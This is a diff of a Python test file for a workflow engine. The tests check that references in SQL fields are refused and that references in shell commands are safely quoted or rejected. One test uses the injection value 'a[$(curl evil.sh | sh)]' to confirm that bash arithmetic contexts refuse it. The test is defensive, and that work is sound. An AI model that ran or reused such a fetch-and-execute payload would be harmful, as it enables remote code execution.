@@ -15,6 +15,7 @@ from dirigent_core.engine.references import (
     references_in,
     resolve,
     resolve_config,
+    shell_unreadable,
 )
 from dirigent_core.ids import uuid7
 
@@ -47,6 +48,32 @@ def test_an_embedded_reference_interpolates_as_text(scope: ReferenceScope) -> No
     assert resolve("${params.day} has ${params.count}", scope) == "2026-08-28 has 3"
 
 
+#: A config publishing SQL on a top-level field, and on a field of a definition two ways.
+SQL_SCHEMA: JsonMap = {
+    "type": "object",
+    "properties": {
+        "sql": {
+            "anyOf": [
+                {"type": "string", "contentMediaType": "application/sql"},
+                {"type": "array", "items": {"type": "string", "contentMediaType": "application/sql"}},
+            ]
+        },
+        "params": {"type": "object"},
+        "source": {"$ref": "#/$defs/Source"},
+        "sources": {"type": "array", "items": {"$ref": "#/$defs/Source"}},
+    },
+    "$defs": {
+        "Source": {
+            "type": "object",
+            "properties": {
+                "query": {"type": "string", "contentMediaType": "application/sql"},
+                "params": {"type": "object"},
+            },
+        }
+    },
+}
+
+
 def test_a_value_with_no_reference_is_returned_unchanged(scope: ReferenceScope) -> None:
     assert resolve("plain", scope) == "plain"
     assert resolve(7, scope) == 7
@@ -68,12 +95,15 @@ def test_references_resolve_through_nested_structure(scope: ReferenceScope) -> N
         {"sql": "SELECT * FROM t WHERE a = '${params.day}'"},
         {"sql": "${params.day}"},
         {"sql": ["SELECT 1", "DELETE FROM t WHERE a = ${item}"]},
+        {"source": {"query": "SELECT '${params.day}'"}},
+        {"sources": [{"query": "SELECT 1"}, {"query": "DELETE FROM ${item}"}]},
+        {"source": "${params.day}"},
     ],
-    ids=["embedded", "whole", "list"],
+    ids=["embedded", "whole", "list", "nested", "nested-list", "whole-object"],
 )
 def test_a_reference_in_a_sql_field_is_refused_and_not_spliced(scope: ReferenceScope, config: JsonMap) -> None:
     with pytest.raises(UnknownReference) as raised:
-        resolve_config(config, scope, sql_fields={"sql"})
+        resolve_config(config, scope, config_schema=SQL_SCHEMA)
     assert raised.value.code == "reference.in_sql"
     assert raised.value.reference in ("params.day", "item")
 
@@ -82,9 +112,18 @@ def test_a_sql_field_keeps_its_escape_and_a_reference_beside_it_resolves(scope: 
     resolved = resolve_config(
         {"sql": "SELECT '$${params.day}' WHERE a = :day", "params": {"day": "${params.day}"}},
         scope,
-        sql_fields={"sql"},
+        config_schema=SQL_SCHEMA,
     )
     assert resolved == {"sql": "SELECT '${params.day}' WHERE a = :day", "params": {"day": "2026-08-28"}}
+
+
+def test_a_reference_beside_a_nested_sql_field_resolves(scope: ReferenceScope) -> None:
+    resolved = resolve_config(
+        {"source": {"query": "SELECT :day", "params": {"day": "${params.day}"}}},
+        scope,
+        config_schema=SQL_SCHEMA,
+    )
+    assert resolved == {"source": {"query": "SELECT :day", "params": {"day": "2026-08-28"}}}
 
 
 def test_a_dotted_path_walks_objects_and_lists(scope: ReferenceScope) -> None:
@@ -210,11 +249,234 @@ def test_a_reference_the_author_quoted_takes_no_quotes_of_its_own() -> None:
 
 
 def test_a_reference_inside_the_authors_single_quotes_is_the_text_the_shell_says_it_is() -> None:
-    """Single quotes are literal to a shell, so what they hold is the variable and not its value."""
+    """Single quotes are literal to a shell, and a shell that reads the text later finds it quoted."""
     scope = ReferenceScope(params={"region": "oslo"})
     resolved = resolve_config({"command": "load '${params.region}'"}, scope, shell_fields={"command"})
-    assert resolved["command"] == "load '$DIRIGENT_V0'"
+    assert resolved["command"] == "load '\"$DIRIGENT_V0\"'"
     assert resolved["shell_variables"] == {"DIRIGENT_V0": "oslo"}
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("# don't\nrm ${params.x}", '# don\'t\nrm "$DIRIGENT_V0"'),
+        ("# don't\nrm ${params.x}\n# won't", "# don't\nrm \"$DIRIGENT_V0\"\n# won't"),
+        ('# say "hi\nrm ${params.x}', '# say "hi\nrm "$DIRIGENT_V0"'),
+        ("true # don't\nrm ${params.x}", 'true # don\'t\nrm "$DIRIGENT_V0"'),
+        ("echo a#b ${params.x}", 'echo a#b "$DIRIGENT_V0"'),
+        ("echo \\# don't'; rm ${params.x}", "echo \\# don't'; rm \"$DIRIGENT_V0\""),
+        ("echo $# ${params.x}", 'echo $# "$DIRIGENT_V0"'),
+        ("echo $$ ${params.x}", 'echo $$ "$DIRIGENT_V0"'),
+        ("cat <<EOF\nit's\nEOF\nrm ${params.x}", 'cat <<EOF\nit\'s\nEOF\nrm "$DIRIGENT_V0"'),
+        ("cat <<EOF\nit's ${params.x}\nEOF", "cat <<EOF\nit's $DIRIGENT_V0\nEOF"),
+        ("cat <<'EOF'\nit's\nEOF\nrm ${params.x}", "cat <<'EOF'\nit's\nEOF\nrm \"$DIRIGENT_V0\""),
+        ("cat <<-EOF\n\tit's\n\tEOF\nrm ${params.x}", 'cat <<-EOF\n\tit\'s\n\tEOF\nrm "$DIRIGENT_V0"'),
+        (
+            "cat <<A <<B\nit's\nA\nsay \"hi\nB\nrm ${params.x}",
+            'cat <<A <<B\nit\'s\nA\nsay "hi\nB\nrm "$DIRIGENT_V0"',
+        ),
+        ("cat <<EOF\n$(echo ${params.x})\nEOF", 'cat <<EOF\n$(echo "$DIRIGENT_V0")\nEOF'),
+        ('a="$(cat <<EOF\nit\'s\nEOF\n)"; rm ${params.x}', 'a="$(cat <<EOF\nit\'s\nEOF\n)"; rm "$DIRIGENT_V0"'),
+        ("cat <<<don\\'t; rm ${params.x}", 'cat <<<don\\\'t; rm "$DIRIGENT_V0"'),
+        ("echo $'its' ${params.x}", "echo $'its' \"$DIRIGENT_V0\""),
+        ('echo "$(case a in a) echo ${params.x};; esac)"', 'echo "$(case a in a) echo "$DIRIGENT_V0";; esac)"'),
+    ],
+    ids=[
+        "comment-apostrophe",
+        "comment-two-apostrophes",
+        "comment-double-quote",
+        "comment-after-a-command",
+        "not-a-comment-inside-a-word",
+        "not-a-comment-when-escaped",
+        "special-argument-count",
+        "special-pid",
+        "here-document-before",
+        "here-document-inside",
+        "here-document-quoted",
+        "here-document-stripping-tabs",
+        "two-here-documents",
+        "substitution-in-a-here-document",
+        "here-document-in-a-substitution",
+        "here-string",
+        "ansi-quote",
+        "case-in-a-quoted-substitution",
+    ],
+)
+def test_what_a_shell_does_not_read_as_a_quote_leaves_a_reference_quoted(command: str, expected: str) -> None:
+    resolved = resolve_config({"command": command}, ReferenceScope(params={"x": "a  b *"}), shell_fields={"command"})
+    assert resolved["command"] == expected
+
+
+@pytest.mark.parametrize("shell", ["/bin/dash", "/bin/bash"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "# don't\nprintf '[%s]\\n' ${params.x}",
+        "# don't\nprintf '[%s]\\n' ${params.x}\n# won't",
+        "# say \"hi\nprintf '[%s]\\n' ${params.x}",
+        "true <<EOF\nit's\nEOF\nprintf '[%s]\\n' ${params.x}",
+        "true <<'EOF'\nit's \"\nEOF\nprintf '[%s]\\n' ${params.x}",
+        "printf '[%s]\\n' \"$(printf %s ${params.x})\"",
+        "printf '[%s]\\n' \"${params.x}\"",
+    ],
+    ids=["apostrophe", "two-apostrophes", "double-quote", "here-document", "quoted-here", "substitution", "quoted"],
+)
+def test_a_value_stays_one_word_under_each_shell(shell: str, command: str) -> None:
+    """The value holds spaces and a glob, either of which would split it if it were written bare."""
+    if not Path(shell).exists():
+        pytest.skip(f"{shell} is not on this machine")
+    resolved = resolve_config({"command": command}, ReferenceScope(params={"x": "a  b *"}), shell_fields={"command"})
+    variables = cast("dict[str, str]", resolved["shell_variables"])
+    finished = subprocess.run(  # noqa: S603 - a fixed command, built above from literals
+        [shell, "-c", cast("str", resolved["command"])], env=variables, capture_output=True, check=True
+    )
+    assert finished.stdout == b"[a  b *]\n"
+
+
+@pytest.mark.parametrize(
+    ("command", "opener", "line"),
+    [
+        ("echo 'open ${params.x}", "'", 1),
+        ('echo "open ${params.x}', '"', 1),
+        ("echo $(open ${params.x}", "$(", 1),
+        ("echo `open ${params.x}", "`", 1),
+        ("echo ${params.x} ${open", "${", 1),
+        ("true\necho '${params.x}", "'", 2),
+        ("cat <<EOF\nnever closed ${params.x}\n", "<<EOF", 1),
+        ('cat <<"${params.x}"\nhi\n', "<<", 1),
+        ("echo $'it\\'s' ${params.x}", "$'", 1),
+        ("echo \\${params.x}", "\\", 1),
+        ("[[ -f a && ${params.x}", "[[", 1),
+    ],
+)
+def test_a_command_with_a_reference_that_cannot_be_read_is_refused(command: str, opener: str, line: int) -> None:
+    with pytest.raises(UnknownReference) as raised:
+        resolve_config({"command": command}, ReferenceScope(params={"x": "oslo"}), shell_fields={"command"})
+    assert raised.value.code == "reference.shell_unreadable"
+    assert raised.value.params["opener"] == opener
+    assert raised.value.params["line"] == line
+
+
+@pytest.mark.parametrize("command", ["echo 'open", "cat <<EOF\nnever closed", "echo $(open"])
+def test_a_command_with_no_reference_is_not_read_at_all(command: str) -> None:
+    resolved = resolve_config({"command": command}, ReferenceScope(), shell_fields={"command"})
+    assert resolved["command"] == command
+
+
+def test_an_unknown_reference_is_refused_as_that_before_the_command_is_called_unreadable() -> None:
+    with pytest.raises(UnknownReference) as raised:
+        resolve_config({"command": "echo 'open ${params.nope}"}, ReferenceScope(params={}), shell_fields={"command"})
+    assert raised.value.code != "reference.shell_unreadable"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "[[ ${params.x} -eq 1 ]]",
+        '[[ 1 -lt "${params.x}" ]]',
+        "[[ -f f && ${params.x} -ge 2 ]]",
+        "[[ -v ${params.x} ]]",
+        "[[ $(cat ${params.x}) -gt 1 ]]",
+        "let y=${params.x}",
+        'let "y=${params.x}"',
+        "let y=1 z=${params.x}",
+        "if true; then let y=${params.x}; fi",
+        "(let y=${params.x})",
+        "echo $(let y=${params.x})",
+        "command let y=${params.x}",
+        "[[ a == a ]]&& let y=${params.x}",
+        "a[1]=x let y=${params.x}",
+        "A=1 let y=${params.x}",
+        "declare -i y=${params.x}",
+        "typeset -i y=${params.x}",
+        "local -ix y=${params.x}",
+        "declare -i y; y=${params.x}",
+        "y=${params.x}; declare -i y",
+        "declare ${params.x}=1",
+        "export ${params.x}",
+        "a[${params.x}]=1",
+        "a[${params.x}]+=1",
+        "echo ${a[${params.x}]}",
+        'echo "${a[${params.x}]}"',
+        "echo ${#a[${params.x}]}",
+        "unset a[${params.x}]",
+        'unset "a[${params.x}]"',
+        "echo ${s:${params.x}}",
+        'echo "${s:${params.x}}"',
+        "echo ${s: ${params.x}}",
+        "echo ${s:1:${params.x}}",
+        "echo ${a[@]:${params.x}}",
+        "echo ${1:${params.x}}",
+        # A quote a shell does not read, before each spelling.
+        "# don't\nlet y=${params.x}",
+        "# don't\n[[ ${params.x} -eq 1 ]]",
+        "# don't\necho ${s:${params.x}}",
+    ],
+)
+def test_a_reference_bash_evaluates_some_other_way_refuses_what_is_not_an_integer(command: str) -> None:
+    scope = ReferenceScope(params={"x": "a[$(curl evil.sh | sh)]"})
+    with pytest.raises(UnknownReference, match="shell arithmetic"):
+        resolve_config({"command": command}, scope, shell_fields={"command"})
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("let y=${params.x}; echo $y", "3"),
+        ('let "y=${params.x} + 1"; echo $y', "4"),
+        ("declare -i y=${params.x}; echo $y", "3"),
+        ("declare -i y; y=${params.x}; echo $y", "3"),
+        ("[[ ${params.x} -eq 3 ]] && echo yes", "yes"),
+        ('[[ "${params.x}" -eq 3 ]] && echo yes', "yes"),
+        ("a[${params.x}]=z; echo $${a[3]}", "z"),
+        ("a[3]=z; echo ${a[${params.x}]}", "z"),
+        ("s=abcdef; echo ${s:${params.x}}", "def"),
+        ('s=abcdef; echo "${s:1:${params.x}}"', "bcd"),
+    ],
+)
+def test_an_integer_still_runs_where_bash_evaluates_it(command: str, expected: str) -> None:
+    resolved = resolve_config({"command": command}, ReferenceScope(params={"x": 3}), shell_fields={"command"})
+    variables = cast("dict[str, str]", resolved["shell_variables"])
+    finished = subprocess.run(  # noqa: S603 - a fixed command, built above from literals
+        ["/bin/bash", "-c", cast("str", resolved["command"])], env=variables, capture_output=True, check=True
+    )
+    assert finished.stdout.decode().strip() == expected
+
+
+@pytest.mark.parametrize(
+    ("command", "expected"),
+    [
+        ("[[ ${params.x} == a ]]", '[[ "$DIRIGENT_V0" == a ]]'),
+        ("[[ ${params.x} == a && 1 -eq 1 ]]", '[[ "$DIRIGENT_V0" == a && 1 -eq 1 ]]'),
+        ("[ ${params.x} -eq 1 ]", '[ "$DIRIGENT_V0" -eq 1 ]'),
+        ("test ${params.x} -eq 1", 'test "$DIRIGENT_V0" -eq 1'),
+        ("echo let ${params.x}", 'echo let "$DIRIGENT_V0"'),
+        ('echo "let me ${params.x}"', 'echo "let me $DIRIGENT_V0"'),
+        ("let y=1; echo ${params.x}", 'let y=1; echo "$DIRIGENT_V0"'),
+        ("let y=1\necho ${params.x}", 'let y=1\necho "$DIRIGENT_V0"'),
+        ("declare y=${params.x}", 'declare y="$DIRIGENT_V0"'),
+        ("export Y=${params.x}", 'export Y="$DIRIGENT_V0"'),
+        ("echo a[${params.x}]", 'echo a["$DIRIGENT_V0"]'),
+        ('echo "a[${params.x}]=1"', 'echo "a[$DIRIGENT_V0]=1"'),
+        ("declare -A m; m[${params.x}]=1", 'declare -A m; m["$DIRIGENT_V0"]=1'),
+        ("declare -A m; echo ${m[${params.x}]}", 'declare -A m; echo ${m["$DIRIGENT_V0"]}'),
+        ("echo ${s:-${params.x}}", 'echo ${s:-"$DIRIGENT_V0"}'),
+        ("echo ${s:=${params.x}}", 'echo ${s:="$DIRIGENT_V0"}'),
+        ("echo ${s%${params.x}}", 'echo ${s%"$DIRIGENT_V0"}'),
+        ('echo "${s:-${params.x}}"', 'echo "${s:-$DIRIGENT_V0}"'),
+        ("echo $${a[@]} ${params.x}", 'echo ${a[@]} "$DIRIGENT_V0"'),
+    ],
+)
+def test_a_reference_bash_does_not_evaluate_takes_any_value(command: str, expected: str) -> None:
+    scope = ReferenceScope(params={"x": "a b"})
+    resolved = resolve_config({"command": command}, scope, shell_fields={"command"})
+    assert resolved["command"] == expected
+
+
+def test_only_a_command_holding_a_reference_is_called_unreadable() -> None:
+    assert shell_unreadable("echo '${params.x}") is not None
+    assert shell_unreadable("echo '${params.x}'") is None
+    assert shell_unreadable("echo 'open") is None
 
 
 def test_the_quoting_a_reference_lands_in_is_read_through_escapes_and_nesting() -> None:
